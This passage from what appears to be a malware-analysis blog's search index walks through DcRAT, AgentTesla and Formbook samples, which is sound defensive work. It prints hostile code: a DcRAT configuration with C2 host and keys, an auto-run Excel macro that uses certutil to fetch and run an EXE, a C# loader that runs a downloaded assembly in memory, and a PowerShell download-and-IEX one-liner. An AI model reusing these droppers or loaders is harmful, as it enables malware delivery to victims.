&quot;FRt1VyhVG2vgyDBi5pdeM5A14MRbYXnBrM5qQ1T21evDrOwE8p5VDe0OmshQuNw9cMHBouTEK3wDr4FDYT0RrxdzN60qxRZw+gwkmF+opxLh4N15jgtAB/XtKl1qRsQEJdpUUrFsc/dO1lYQSrS6vCeEMd0v1d+JnXn8k5qid760Fg5u7L+/GQ1cezCarjZ2kQUfd+/QrZ4ukxqzYuTVq/GesG5XYL/CdTV72GZb8LYuleuq+ettGNo1T80CIhXJ6CM6Qqna3XcoyOE5kD2Ioc6BRJeK//H4npK+zzkqnT1/5M/wRzlo4rcqHB1EYDKKYVC2PQhe1VomPkwzqd1h7NRsy2AtUYfWTsEdWT/Exit/D3o03rI9r0diiKn/oUCMms5qaKep53pLWjLkiBtgitSn/XhyvwDPWCpVE4LcJbmk8LzvLGO4HQJRq6hNeynbt2S4c1av+APiUS42WvedHhb1saLO6MsIlTdVvEO5OcAq6apEJXOYuDg05LwEI2Kf3SWSFAZCV4mBA3pcYJaysvNohL40uaGopVlz4JkaYkBnKE6qAJAelv0EAOfuooP1QTni+ikT3Oj9p99dNURmP8YxHIMC+sYQrs2a5dGoUI99M3yk4z49u45YWVGPJ94OGmLb4+z8HFOVNN//0ATqkltkP6z/QPFRapIWz+bPobCHLOPRzT2kygZutJ7G0MQhDc2BUfSg+UWV9yu4omlRsyydBe1TkmKKmVsQakt14AFtbHLCFOSGd44LRlMUupYsQLr6JOUba250039fu+pdxo8S//m4aqmekrI246/6NcfbAMnscN5Y/6lB82fKhIIPQU/8O+HJQj+GGMtKK97PYy1/xjg7qMWhn62qCIRSgY4J5/ZKHptZrAKijG7EmUBZW8qVub9yGGSKcS5UZ2IEltY+PJgxCcdcoTmGdKDU5oEMaxP56/51vx4QFISnqoZvKrr9tD7xmn6Xjbnqjy5tsPI90RPw/6lsaGnGe4z/mWrjpOI3WXLI1WkASnjgaYhaTCaLGQ2AVUnp+coQnEyhEP60z24W3o6RGL9ClvxYMzZJAMCYAkAeaMoQ5b36uK4F&quot;; public static string Server_signa_ture = &quot;SINLJan/0TFj5M2ElE91NPC7mWSMGkC99zKmLdlQkd/I8LyHWPnj5hDLz90v8qYZRV1d9X3mLu4fDn/EYWiG/hC2J2j9MrNsHUeu/rSdecMeGqWq925+ecTXftWSMrpxlYhA2KgcKBbpM4P/eH4SffRgDYtch6pl6H8mx9y595kAGaqF0lugOWLqvWk0rSahBToNlLvpdC9ivSuWyuUhpnWlHsZIifC7/qsMA5JUQVpw/kxJfEzxtvz2mEQO00/U3a95SMD5N+DwL4VCRmN6mX0lHfjIpO9L6yBghZhW1so=&quot;; public static X509Certificate2 Server_Certificate; public static Aes256 aes256; public static string Paste_bin = &quot;bJMeCQ+O0TOP7Mimb+LvM7YW+MG+LMhrig9F98i7Nq0Cf6vDG5QD0dDmvlpP2i6osVFcGu8J6upk/n9X7YOx1g==&quot;; public static string BS_OD = &quot;5e5wxuNXiS4QhUtSFmcXlMN/zwGpAgWFR7TAEtRIDeyN7OWkaRRNeC9nJ6ntc9Hvc8wF3OAqcV8YGGhscsQSSg==&quot;; public static string Hw_id = null; public static string De_lay = &quot;1&quot;; public static string Group = &quot;wZWrR/yvCwjmNMoS1xk3yYz/TleFz0+gmpNA4gJZ2vgSeyfX/K73NfIcVfuLUGPasaVgSUO6pLJoNVcB/FqlSw==&quot;; public static string Anti_Process = &quot;aZ12B0T+g0y0kb+3txbww4Hoe7T+8yiR2wblpQCzwI+pB0INXDGOhXaWNkf8CLZDqhgO/CPYoMwlZJ0FMl0Fhg==&quot;; public static string An_ti = &quot;yFsA3ZmKBpFvdy3/VrPEwMuoG+BVaWzfBohXvIqmZ2LoaiIqz+StD0aFxFuZIufPAvKtRXVJZ2NUVhR7YAGyRA==&quot;; public static bool InitializeSettings() { ...The Settings class for this payload contains a block of settings that appear consistent with AsyncRAT settings. Since it looks like we’re working with AsyncRAT or a clone of it, we can use the AsyncRAT Config Parser from @jeFF0Falltrades to obtain the plaintext configuration.remnux@remnux:~/cases/dcrat-snip3$ ./async_rat_config_parser.py payload.exe | jq[ { &quot;file_path&quot;: &quot;payload.exe&quot;, &quot;aes_key&quot;: &quot;846ca7dddc5312f58468a967e5e7a4ec9e6de4120b03a1806dbfd976785a95d8&quot;, &quot;aes_salt&quot;: &quot;4463526174427971777164616e6368756e&quot;, &quot;config&quot;: { &quot;Por_ts&quot;: &quot;5900&quot;, &quot;Hos_ts&quot;: &quot;rick63.publicvm[.]com&quot;, &quot;Ver_sion&quot;: &quot; 1.0.7&quot;, &quot;In_stall&quot;: &quot;false&quot;, &quot;Install_Folder&quot;: &quot;%AppData%&quot;, &quot;Install_File&quot;: &quot;&quot;, &quot;Key&quot;: &quot;MnB2MzZTUFI4bTFFZXNVUW1tdlI0bFJ1blNMUUZIbk4=&quot;, &quot;MTX&quot;: &quot;DcRatMutex_qwqdanchun&quot;, &quot;Certifi_cate&quot;: &quot;MIICMDCCAZmgAwIBAgIVANDdhyIzFkRkVUdU1pUsWShwjeXTMA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bjEcMBoGA1UECgwTRGNSYXQgQnkgcXdxZGFuY2h1bjELMAkGA1UEBwwCU0gxCzAJBgNVBAYTAkNOMB4XDTIwMTEyNzIxMjU0NVoXDTMxMDkwNjIxMjU0NVowEDEOMAwGA1UEAwwFRGNSYXQwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAJAPN6hAAYtlFpprsg+awNYGXe+gvrIVoVQz2ubNjglQKceBMbhrB9fJZfXJkDLol6/a3Jd4JycS51W+zZgLbcjK8rwRyJ+AUI9TJN4ghCPvSgqXiqTzwruPo+z8B41xcddSJ8Iv49ReFpZGNfbzC4AL5U3gWj+Gq+o4Eh1TigrrAgMBAAGjMjAwMB0GA1UdDgQWBBSieJAE4Zd65wRgTOwM9yD2xjDKZjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4GBAH+wbEwYgTSF3NRuSaLbjALT8E5lmhrkkc7l8R7dojnqZqGA6GqIR3B1aERDKeX6YY3msdmw4uK4K7qWXuWRhjn1Zbweea4YrUyTLtTu1OYJpE9z7vVTfXi7Pkl+j9187kZ8f+S+EvFo9aw2YO5jK9UTyZ8dhtQuhpC9sRSCwQ5f&quot;, &quot;Server_signa_ture&quot;: &quot;UWZseCaaZjexEDVQ2lOsjGF3/bzIWM+AtaMG8YJOKeCH6T82VGt+odwaoTThFyioEEzEKgOuucbs5V3F2LoXzpK1RtKu8B4z62M6aSvVRE1NYj3zgTzf4jSqH+Y5W1G+OA4tBTUv6V21bxJSCYeMSAZFXT6Xil6DULdEBDYKzUs=&quot;, &quot;Paste_bin&quot;: &quot;null&quot;, &quot;BS_OD&quot;: &quot;false&quot;, &quot;De_lay&quot;: &quot;1&quot;, &quot;Group&quot;: &quot;Default&quot;, &quot;Anti_Process&quot;: &quot;false&quot;, &quot;An_ti&quot;: &quot;false&quot; } }]Now that we’ve parsed the configuration, a couple things look slightly odd. In authentic AsyncRAT payloads the mutex (MTX) value appears similar to AsyncMutex_6SI8OkPnk. In this case, the MTX value is DcRatMutex_qwqdanchun. This leads me to hypothesize that this payload is really DcRAT instead of AsyncRAT. So how can we prove or disprove it? DCRat is essentially a clone of AsyncRAT with some extra things added in, so the configuration portion is definitely close enough to be parsed by anything that can handle AsyncRAT. The next piece of evidence would be the Certificate field in the configuration. Once parsed using CyberChef’s “Parse X.509 Certificate (base64)” recipe, we can see the details of the self-signed certificate included with the payload:Version: 3 (0x02)Serial number: 1192410316816341397168958607972492981491697837523 (0x00d0dd872233164464554754d6952c5928708de5d3)Algorithm ID: SHA512withRSAValidity Not Before: 27/11/2020 21:25:45 (dd-mm-yyyy hh:mm:ss) (201127212545Z) Not After: 06/09/2031 21:25:45 (dd-mm-yyyy hh:mm:ss) (310906212545Z)Issuer CN = DcRat Server OU = qwqdanchun O = DcRat By qwqdanchun L = SH C = CNSubject CN = DcRatPublic Key Algorithm: RSA Length: 1024 bits Modulus: 90:0f:37:a8:40:01:8b:65:16:9a:6b:b2:0f:9a:c0:d6: 06:5d:ef:a0:be:b2:15:a1:54:33:da:e6:cd:8e:09:50: 29:c7:81:31:b8:6b:07:d7:c9:65:f5:c9:90:32:e8:97: af:da:dc:97:78:27:27:12:e7:55:be:cd:98:0b:6d:c8: ca:f2:bc:11:c8:9f:80:50:8f:53:24:de:20:84:23:ef: 4a:0a:97:8a:a4:f3:c2:bb:8f:a3:ec:fc:07:8d:71:71: d7:52:27:c2:2f:e3:d4:5e:16:96:46:35:f6:f3:0b:80: 0b:e5:4d:e0:5a:3f:86:ab:ea:38:12:1d:53:8a:0a:eb Exponent: 65537 (0x10001)Certificate Signature Algorithm: SHA512withRSA Signature: 7f:b0:6c:4c:18:81:34:85:dc:d4:6e:49:a2:db:8c:02: d3:f0:4e:65:9a:1a:e4:91:ce:e5:f1:1e:dd:a2:39:ea: 66:a1:80:e8:6a:88:47:70:75:68:44:43:29:e5:fa:61: 8d:e6:b1:d9:b0:e2:e2:b8:2b:ba:96:5e:e5:91:86:39: f5:65:bc:1e:79:ae:18:ad:4c:93:2e:d4:ee:d4:e6:09: a4:4f:73:ee:f5:53:7d:78:bb:3e:49:7e:8f:dd:7c:ee: 46:7c:7f:e4:be:12:f1:68:f5:ac:36:60:ee:63:2b:d5: 13:c9:9f:1d:86:d4:2e:86:90:bd:b1:14:82:c1:0e:5fExtensions subjectKeyIdentifier : a2789004e1977ae704604cec0cf720f6c630ca66 basicConstraints CRITICAL: cA=trueIn the case of AsyncRAT, the CN field would be “AsyncRAT Server” or something similar. In this case, it’s “DCRat Server”, more evidence of DCRat. The final piece of evidence comes from an interesting place in the payload’s decompiled source. When AsyncRAT and its clones generate a RAT client, the settings of that client are encrypted with AES and salted. In the case of AsyncRAT, the salt is a byte array:private static readonly byte[] Salt = { 0xBF, 0xEB, 0x1E, 0x56, 0xFB, 0xCD, 0x97, 0x3B, 0xB2, 0x19, 0x2, 0x24, 0x30, 0xA5, 0x78, 0x43, 0x0, 0x3D, 0x56, 0x44, 0xD2, 0x1E, 0x62, 0xB9, 0xD4, 0xF1, 0x80, 0xE7, 0xE6, 0xC3, 0x39, 0x41 };In the sample, the salt value is different:private static readonly byte[] Salt = Encoding.ASCII.GetBytes(&quot;DcRatByqwqdanchun&quot;);This finding in the payload source is consistent with the source code of DcRAT in Github. Thus, we can definitively say this threat is DcRAT! Remember, when analyzing payloads protected with crypters you can’t always assume they lead to one particular threat, you have to positively identify the final threat using evidence instead of assumptions.Thank you for reading!" }, { "title": "An AgentTesla Sample Using VBA Macros and Certutil", "url": "/agenttesla-vba-certutil-download/", "categories": "malware", "tags": "malware, agenttesla, macro, certutil", "date": "2022-03-26 00:00:00 +0000", "snippet": "AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes further AgentTesla malware. If you want to follow along at home, the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/d1c616976e917d54778f587a2550ee5568a72b661d5f04e68d194ce998864d84/.Triaging the first stageFirst stop, triage! MalwareBazaar claims the file is a XLSM Excel document but we should still verify just in case.remnux@remnux:~/cases/tesla-xlsm$ diec mv_tvm.xlsm Binary Archive: Zip(2.0)[25.6%,1 file] Data: ZIP archiveremnux@remnux:~/cases/tesla-xlsm$ file mv_tvm.xlsm mv_tvm.xlsm: Microsoft Excel 2007+remnux@remnux:~/cases/tesla-xlsm$ xxd mv_tvm.xlsm | head00000000: 504b 0304 1400 0800 0800 780d 7954 7c5e PK........x.yT|^00000010: 7c2f 8e01 0000 1006 0000 1300 0000 5b43 |/............[C00000020: 6f6e 7465 6e74 5f54 7970 6573 5d2e 786d ontent_Types].xm00000030: 6ccd 544d 6fdb 300c fd2b 86ae 85a5 b487 l.TMo.0..+......00000040: 6218 e2f4 b076 c7b5 c0ba 1fc0 484c ac46 b....v......HL.F00000050: 5f10 d534 f9f7 a3ec 066b 0377 c8b0 0cd8 _..4.....k.w....00000060: c516 f5f8 f81e 65ca f39b 9d77 cd16 33d9 ......e....w..3.00000070: 183a 7129 67a2 c1a0 a3b1 61dd 891f 8f5f .:q)g.....a...._00000080: db4f a2a1 02c1 808b 013b b147 1237 8bf9 .O.......;.G.7..00000090: e33e 2135 cc0d d489 be94 f459 29d2 3d7a .&amp;gt;!5.......Y).=zDetect-It-Easy thinks we have a ZIP archive and file thinks we have a Microsoft Excel 2007+ document. Both are correct as MS Excel 2007+ documents are essentially ZIP archives containing XML files. We can verify that assumption using xxd and seeing the file names of XML files within the XLSM document. Now we definitely know, this document is for MS Excel.Analyzing the document macroThe easiest way to grab low-hanging macro functionality for me is through olevba. In this case, the macro functionality is straightforward:remnux@remnux:~/cases/tesla-xlsm$ olevba mv_tvm.xlsm olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools===============================================================================FILE: mv_tvm.xlsmType: OpenXML-------------------------------------------------------------------------------VBA MACRO ThisWorkbook.cls in file: xl/vbaProject.bin - OLE stream: &#39;VBA/ThisWorkbook&#39;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Private Sub Workbook_Open()PID = Shell(&quot;cmd /c certutil.exe -urlcache -split -f &quot;&quot;hxxp://18.179.111[.]240/xr0/loader/uploads/scan08710203065.exe&quot;&quot; Lqdzvm.exe.exe &amp;amp;&amp;amp; Lqdzvm.exe.exe&quot;, vbHide)End Sub+----------+--------------------+---------------------------------------------+|Type |Keyword |Description |+----------+--------------------+---------------------------------------------+|AutoExec |Workbook_Open |Runs when the Excel Workbook is opened ||Suspicious|Shell |May run an executable file or a system || | |command ||Suspicious|vbHide |May run an executable file or a system || | |command ||Suspicious|Hex Strings |Hex-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) ||Suspicious|Base64 Strings |Base64-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) ||IOC |hxxp://18.179.111[.]24|URL || |0/xr0/loader/uploads| || |/scan08710203065.exe| ||IOC |18.179.111[.]240 |IPv4 address ||IOC |certutil.exe |Executable file name ||IOC |scan08710203065.exe |Executable file name ||IOC |Lqdzvm.exe |Executable file name |+----------+--------------------+---------------------------------------------+The macro contains a subroutine named Workbook_Open, which launches when Excel opens this document. The subroutine executes a Shell command, which spawns cmd.exe and a certutil.exe process. The certutil process uses a -urlcache and -split command line option, downloads from the specified URL, and stores the contents within Lqdzvm.exe.exe Afterward, cmd.exe executes the downloaded EXE.Since the VBA macro here is pretty brief, there’s not much else to investigate in the document. Let’s move on to the second stage, the downloaded EXE.Analyzing Lqdzvm.exe.exeWe can get a lead on this EXE using diec and file.remnux@remnux:~/cases/tesla-xlsm$ file Lqdzvm.exe.exe Lqdzvm.exe.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windowsremnux@remnux:~/cases/tesla-xlsm$ diec Lqdzvm.exe.exe PE32 Protector: Smart Assembly(-)[-] Library: .NET(v4.0.30319)[-] Linker: Microsoft Linker(8.0)[GUI32]The file output for the EXE indicates it is a Mono/.NET assembly for Windows. The diec command gets more specific, showing the EXE is also protected using Smart Assembly, a commercial obfuscator for .NET technologies. Using that knowledge we can attempt some deobfuscation and decompilation using ilspycmd.remnux@remnux:~/cases/tesla-xlsm$ de4dot Lqdzvm.exe.exe -p sade4dot v3.1.41592.3405 Copyright (C) 2011-2015 de4dot@gmail.comLatest version and source code: https://github.com/0xd4d/de4dotDetected SmartAssembly 8.1.0.4892 (/home/remnux/cases/tesla-xlsm/Lqdzvm.exe.exe)Cleaning /home/remnux/cases/tesla-xlsm/Lqdzvm.exe.exeRenaming all obfuscated symbolsSaving /home/remnux/cases/tesla-xlsm/Lqdzvm.exe-cleaned.exeremnux@remnux:~/cases/tesla-xlsm$ ilspycmd Lqdzvm.exe-cleaned.exe &amp;gt; Lqdzvm.exe-cleaned.decompiled.csFrom here we can examine the decompiled C# code, starting with the assembly properties.[assembly: CompilationRelaxations(8)][assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)][assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)][assembly: AssemblyTitle(&quot;BandiFix&quot;)][assembly: AssemblyDescription(&quot;BandiFix&quot;)][assembly: AssemblyConfiguration(&quot;&quot;)][assembly: AssemblyCompany(&quot;Bandicam.com&quot;)][assembly: AssemblyProduct(&quot;BandiFix&quot;)][assembly: AssemblyCopyright(&quot;Copyright(c) 2010-2020 Bandicam.com. All rights reserved.&quot;)][assembly: AssemblyTrademark(&quot;&quot;)][assembly: ComVisible(false)][assembly: Guid(&quot;3659e84e-1949-4909-85ac-f5710802a51c&quot;)][assembly: AssemblyFileVersion(&quot;2.0.0.111&quot;)][assembly: TargetFramework(&quot;.NETFramework,Version=v4.0&quot;, FrameworkDisplayName = &quot;.NET Framework 4&quot;)][assembly: AssemblyVersion(&quot;2.0.0.111&quot;)]The assembly properties/attributes here resemble those for the Bandicam BandiFix application. The adversary is likely trying to masquerade as the application to avoid attention. The GUID 3659e84e-1949-4909-85ac-f5710802a51c in this EXE is a TypeLib ID GUID. You can potentially use the property in VT or other tools to pivot and find similar EXEs.Next, we can dive into the entry point, Main().namespace ns0{ internal class Class0 { [STAThread] private static void Main() { Class1.smethod_0(); Class1.smethod_1(); Class2.smethod_1(); } }The Main() function is pretty simple, branching off to three other methods defined in two classes. Let’s jump into the code at Class1.smethod_0() to see it.internal class Class1{ static void smethod_0() { ProcessStartInfo val = new ProcessStartInfo(); val.set_FileName(&quot;powershell&quot;); val.set_Arguments(&quot;-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMgAwAA==&quot;); val.set_WindowStyle((ProcessWindowStyle)1); Process.Start(val).WaitForExit(); try { ServicePointManager.set_SecurityProtocol((SecurityProtocolType)3072); } catch { } }This method creates a ProcessStartInfo object, fills its properties with values to launch PowerShell with a base64-encoded command line, sets the window style to hidden, and starts the PowerShell process. The encoded PowerShell command decodes to Start-Sleep -Seconds 20. Combined with the WaitForExit() function when started, this shows the code waits/sleeps for 20 seconds before moving to the next step. In the next step, the code sets the .NET ServicePointManager’s SecurityProtocol property to TLS1.2.Now we can move into the next function, Class1.smethod_1().static void smethod_1(){ List&amp;lt;byte&amp;gt; list = new List&amp;lt;byte&amp;gt;(); byte[] array = Class2.smethod_0(); Stack val = new Stack(); val.Push((object)&quot;Welcome&quot;); val.Push((object)&quot;Tutlane&quot;); val.Push((object)20.5f); val.Push((object)10); val.Push((object)null); int num = array.Length; while (num-- &amp;gt; 0) { list.Add(array[num]); } val.Push((object)100); foreach (object? item in val) { Console.WriteLine(item); } AppDomain.CurrentDomain.Load(list.ToArray());}Within the function there is immediately some interesting code. First, there is a byte[] array that holds content from Class2.smethod_0() byte arrays in malware tend to include string or binary content, so my hypothesis for the array is that is designed to hold one of those. The code then manipulates a Stack object, pushing objects onto it. It doesn’t seem to use them in a productive way outside a subsequent Console.WriteLine call. The byte array does get used, in a reversal algorithm. The num variable and following while loop starts with the ending element of the byte array and moves backward to the first, adding each element to a list. After the reversal, the list gets converted back to an array and used as a parameter for AppDomain.CurrentDomain.Load(). This call is designed to load an arbitrary .NET assembly into the current application domain. This is roughly similar to System.Reflection.Assembly.Load(). This adds some credence to our hypothesis from earlier, that the byte array will likely hold binary content that translates into an assembly. So let’s pivot over to that function to see what it does.internal class Class2 : Process{internal static byte[] smethod_0(){ string[] array = new string[3] { &quot;Dot&quot;, &quot;Net&quot;, &quot;Perls&quot; }; Stack&amp;lt;string&amp;gt; val = new Stack&amp;lt;string&amp;gt;((IEnumerable&amp;lt;string&amp;gt;)array); Enumerator&amp;lt;string&amp;gt; enumerator = val.GetEnumerator(); try { while (enumerator.MoveNext()) { string current = enumerator.get_Current(); Console.WriteLine(current); } } finally { ((IDisposable)enumerator).Dispose(); } return Class1.smethod_2(&quot;hxxp://18.179.111[.]240/xr0/loader/uploads/scan08710203065_Kvnllpaf.jpg&quot;);}Most of the code in this function is either junk or imposes a slight delay before further execution. The only real important code in the function is the last line that calls Class1.smethod_2(), passing in a URL to an alleged JPG file. We know this function is supposed to return a byte array to get reversed and loaded into memory, so there’s a decent chance this upcoming code performs a download of a reversed Windows EXE or DLL. Let’s jump to that code:static byte[] smethod_2(string string_0){ using MemoryStream memoryStream = new MemoryStream(); WebRequest val = WebRequest.Create(string_0); Stream responseStream = val.GetResponse().GetResponseStream(); responseStream.CopyTo(memoryStream); return memoryStream.ToArray();}Sure enough, the method creates a WebRequest object for the URL, passes its response into a MemoryStream, and returns the content as a byte array. This function ends the second branch of code from Main(), and we can dive into the final function from Main() here:internal static void smethod_1(){ Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies(); foreach (Assembly assembly in assemblies) { Type[] types = assembly.GetTypes(); foreach (Type type in types) { try { Queue&amp;lt;int&amp;gt; val = new Queue&amp;lt;int&amp;gt;(); val.Enqueue(10); val.Enqueue(23); val.Enqueue((int)type.InvokeMember(&quot;Zsjeajjr&quot;, BindingFlags.InvokeMethod, null, null, null)); val.Enqueue(5); val.Enqueue(29); Enumerator&amp;lt;int&amp;gt; enumerator = val.GetEnumerator(); try { while (enumerator.MoveNext()) { int current = enumerator.get_Current(); Console.WriteLine(current); } } ...I’ve gone ahead and left out some of the function code for brevity, the important bits are shown above. For each class/type in each assembly namespace in this application domain, the code searches for a method named Zsjeajjr(). Once found, the method gets invoked and control is passed to that method.Now we can explore that scan08710203065_Kvnllpaf.jpg file downloaded and loaded!Analyzing scan08710203065_Kvnllpaf.jpgFrom the previous stage we know this file should contain the bytes of a Windows EXE or DLL that are reversed. Our typical file and diec commands won’t work because the first bytes of the file will presumably be zeroes. We can use xxd and tail to see the file contents.remnux@remnux:~/cases/tesla-xlsm$ xxd scan08710203065_Kvnllpaf.jpg | tail00095760: 0009 5000 0006 010b 210e 00e0 0000 0000 ..P.....!.......00095770: 0000 0000 623c f3a6 0003 014c 0000 4550 ....b&amp;lt;.....L..EP00095780: 0000 0000 0000 0024 0a0d 0d2e 6564 6f6d .......$....edom00095790: 2053 4f44 206e 6920 6e75 7220 6562 2074 SOD ni nur eb t000957a0: 6f6e 6e61 6320 6d61 7267 6f72 7020 7369 onnac margorp si000957b0: 6854 21cd 4c01 b821 cd09 b400 0eba 1f0e hT!.L..!........000957c0: 0000 0080 0000 0000 0000 0000 0000 0000 ................000957d0: 0000 0000 0000 0000 0000 0000 0000 0000 ................000957e0: 0000 0000 0000 0040 0000 0000 0000 00b8 .......@........000957f0: 0000 ffff 0000 0004 0000 0003 0090 5a4d ..............ZMExcellent, we have a MZ header and DOS stub reversed in the file bytes. We can easily get the original order using PowerShell code:[Byte[]] $code = Get-Content -AsByteStream ./scan08710203065_Kvnllpaf.jpg[Array]::Reverse($code)Set-Content -Path ./original.bin -Value $code -AsByteStreamNow we can examine the original binary file to see the next steps.remnux@remnux:~/cases/tesla-xlsm$ diec original.bin PE32 Protector: Eziriz .NET Reactor(6.x.x.x)[By Dr.FarFar] Library: .NET(v4.0.30319)[-] Linker: Microsoft Linker(6.0)[DLL32]remnux@remnux:~/cases/tesla-xlsm$ file original.bin original.bin: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsOnce again, this stage looks to be a .NET DLL packed using .NET Reactor, another commercial obfuscator. This is where I want to stop for the evening because when I tried to move into subsequent stages I was stumped by some of the obfuscation and the amount of code in this original DLL. I leave its deobfuscation and decompilation up to the reader as further work if desired, and the sample is available in MalwareBazaar here: https://bazaar.abuse.ch/sample/5250352cea9441dd051802bd58ccc6b2faf05007ee599e6876b9cce3fdc5aa26/.Thanks for reading!" }, { "title": "Formbook Distributed Via VBScript, PowerShell, and C# Code", "url": "/formbook-via-vbs-powershell-and-csharp/", "categories": "malware", "tags": "malware, formbook, vbscript, powershell, csharp", "date": "2022-03-25 00:00:00 +0000", "snippet": "Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbook and distribute it to victims in an opportunistic fashion. This is really similar to the model of buying other stealers like Redline or RATs like Netwire. In this blog post, I’ll walk through the analysis of a VBScript designed to eventually drop Formbook to a victim. For those following along at home, the sample I’m working with is here in MalwareBazaar: https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/.Triaging the fileTo start off, let’s verify the first stage is a VBScript. We can use a combination of file, xxd, and head to do this.remnux@remnux:~/cases/formbook-vbs$ file revised-invoice.vbs revised-invoice.vbs: ASCII text, with CRLF line terminatorsremnux@remnux:~/cases/formbook-vbs$ xxd revised-invoice.vbs | head00000000: 4d4e 4342 4243 5842 4e43 5842 4e58 4242 MNCBBCXBNCXBNXBB00000010: 4d43 5842 4358 4d58 434e 5843 424e 203d MCXBCXMXCNXCBN =00000020: 2022 5722 2622 5322 2622 6322 2622 5222 &quot;W&quot;&amp;amp;&quot;S&quot;&amp;amp;&quot;c&quot;&amp;amp;&quot;R&quot;00000030: 2622 6922 2643 4852 2838 3029 2622 742e &amp;amp;&quot;i&quot;&amp;amp;CHR(80)&amp;amp;&quot;t.00000040: 2226 2273 2226 2268 2226 4348 5228 3639 &quot;&amp;amp;&quot;s&quot;&amp;amp;&quot;h&quot;&amp;amp;CHR(6900000050: 2926 224c 2226 224c 220d 0a53 6574 2042 )&amp;amp;&quot;L&quot;&amp;amp;&quot;L&quot;..Set B00000060: 4e43 585a 4d58 5842 4e58 424e 4358 4e4d NCXZMXXBNXBNCXNM00000070: 4358 424e 4358 4e43 434e 5858 4e43 5842 CXBNCXNCCNXXNCXB00000080: 4d43 584d 4a48 4453 4453 4a20 3d20 4372 MCXMJHDSDSJ = Cr00000090: 6561 7465 4f62 6a65 6374 284d 4e43 4242 eateObject(MNCBBThe file output of “ASCII text” is consistent with what I expect from a VBScript file, it should be just text in a file. The xxd output is consistent as well. The ASCII representation of the bytes on the right side show plain text. We can take a look at the contents here:MNCBBCXBNCXBNXBBMCXBCXMXCNXCBN = &quot;W&quot;&amp;amp;&quot;S&quot;&amp;amp;&quot;c&quot;&amp;amp;&quot;R&quot;&amp;amp;&quot;i&quot;&amp;amp;CHR(80)&amp;amp;&quot;t.&quot;&amp;amp;&quot;s&quot;&amp;amp;&quot;h&quot;&amp;amp;CHR(69)&amp;amp;&quot;L&quot;&amp;amp;&quot;L&quot;Set BNCXZMXXBNXBNCXNMCXBNCXNCCNXXNCXBMCXMJHDSDSJ = CreateObject(MNCBBCXBNCXBNXBBMCXBCXMXCNXCBN)UIWUEWIUIEWUYEIUEWWUEWEIEWU = &quot;Po&quot;JHDSJHDSHJDSJHDSJHDSJJDSSDSHDSJHDSJHSJDSJDSJ = &quot;W&quot;&amp;amp;CHR(69)&amp;amp;&quot;RshE&quot;HSDHDSHJDSJHDSJHDSJHSDJHDSJHDSJHDSJSDJDJDSJ = &quot;&quot;+UIWUEWIUIEWUYEIUEWWUEWEIEWU+JHDSJHDSHJDSJHDSJHDSJJDSSDSHDSJHDSJHSJDSJDSJ+&quot;LL -exeCutiO BYpASS -C I`eX(n`EW-Ob`J`EcT nET`.weBCLi`ENt).DoWnloAdStRiNG(&#39;hxxps://transfer[.]sh/get/9GqmOG/jramooooss.ps1&#39;) &quot;BNCXZMXXBNXBNCXNMCXBNCXNCCNXXNCXBMCXMJHDSDSJ.Run(HSDHDSHJDSJHDSJHDSJHSDJHDSJHDSJHDSJSDJDJDSJ),0Just looking at the code above gives us a couple leads. First, the transfer[.]sh URL looks like it downloads some code to execute in PowerShell. We can clean up the code a bit to see what the simplified script would be:Set WscriptShell = CreateObject(&quot;WScript.Shell&quot;)WscriptShell.Run(&quot;powershell -exeCutiO BYpASS -C I`eX(n`EW-Ob`J`EcT nET`.weBCLi`ENt).DoWnloAdStRiNG(&#39;hxxps://transfer[.]sh/get/9GqmOG/jramooooss.ps1&#39;) &quot;),0The PowerShell command issued by this script will then cause wscript.exe to spawn powershell.exe, download code from transfer[.]sh, and execute it using an Invoke-Expression cmdlet.Examining the PowerShellTo get further in the next step, we can examine jramooooss.ps1. After inserting some line breaks to beautify the code, we have:$whatever = 